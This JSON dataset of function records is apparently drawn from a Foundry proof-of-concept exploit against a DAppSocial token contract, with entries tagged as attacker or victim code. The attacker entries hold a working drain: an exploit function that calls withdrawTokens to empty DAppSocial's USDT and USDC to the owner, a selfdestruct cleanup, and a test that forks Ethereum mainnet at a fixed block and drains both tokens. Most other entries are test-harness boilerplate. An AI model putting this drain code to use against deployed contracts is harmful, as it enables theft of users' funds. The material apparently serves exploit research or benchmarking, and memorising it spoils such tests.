[
  {
    "contract/interface": "HelperExploitContract",
    "source_type": "attacker_contract",
    "function_name": "exploit",
    "original_code": "    function exploit(address token, bool withdraw) external {\n        require(msg.sender == owner, \"Only owner\");\n        if (withdraw == true) {\n            if (token == address(USDT)) {\n                DAppSocial.withdrawTokens(address(token), USDT.balanceOf(address(DAppSocial)));\n                USDT.transfer(owner, USDT.balanceOf(address(this)));\n            } else {\n                DAppSocial.withdrawTokens(address(token), USDC.balanceOf(address(DAppSocial)));\n                USDC.transfer(owner, USDC.balanceOf(address(this)));\n            }\n",
    "description": ""
  },
  {
    "contract/interface": "HelperExploitContract",
    "source_type": "attacker_contract",
    "function_name": "killMe",
    "original_code": "    function killMe() external {\n        require(msg.sender == owner, \"Only owner\");\n        selfdestruct(owner);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "DAppTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "DAppTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "DAppTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "DAppTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "DAppTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "DAppTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 18_048_982);\n        vm.label(address(USDT), \"USDT\");\n        vm.label(address(USDC), \"USDC\");\n        vm.label(address(DAppSocial), \"DAppSocial\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "DAppTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "DAppTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "DAppTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "DAppTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "DAppTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "DAppTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "DAppTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        deal(address(USDT), address(this), 5e6);\n        deal(address(USDC), address(this), 5e6);\n        helperExploitContract = new HelperExploitContract();\n        USDT.approve(address(DAppSocial), 2e6);\n        USDC.approve(address(DAppSocial), 2e6);\n\n        emit log_named_decimal_uint(\"Attacker USDT balance before exploit\", USDT.balanceOf(address(this)), 6);\n\n        emit log_named_decimal_uint(\n            \"Attacker USDC balance before exploit\", USDC.balanceOf(address(this)), USDC.decimals()\n        );\n\n        drainToken(address(USDT));\n        drainToken(address(USDC));\n\n        // Destroy (selfdestruct) helper exploit contract after draining the tokens\n        helperExploitContract.killMe();\n\n        emit log_named_decimal_uint(\"Attacker USDT balance after exploit\", USDT.balanceOf(address(this)), 6);\n\n        emit log_named_decimal_uint(\n            \"Attacker USDC balance after exploit\", USDC.balanceOf(address(this)), USDC.decimals()\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDAppSocial",
    "source_type": "victim_contract",
    "function_name": "depositTokens",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDAppSocial",
    "source_type": "victim_contract",
    "function_name": "lockTokens",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDAppSocial",
    "source_type": "victim_contract",
    "function_name": "withdrawTokens",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDAppSocial",
    "source_type": "victim_contract",
    "function_name": "withdrawTokensWithAlt",
    "original_code": "",
    "description": ""
  }
]